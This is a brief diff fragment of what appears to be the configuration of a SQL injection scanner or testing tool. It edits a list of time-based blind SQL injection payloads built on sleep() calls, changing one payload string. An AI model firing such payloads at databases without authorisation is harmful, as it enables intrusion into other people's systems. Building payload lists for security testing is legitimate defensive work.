@@ -10,7 +10,7 @@ sqli_config = {
     "payload": [
         "'xor(sleep(%d))or'",
         "\"xor(sleep(%d))or\"",
-        "1 xor(sleep(%d))or'",
+        "1 xor(sleep(%d))",
         ",sleep(%d)",
     ],
 
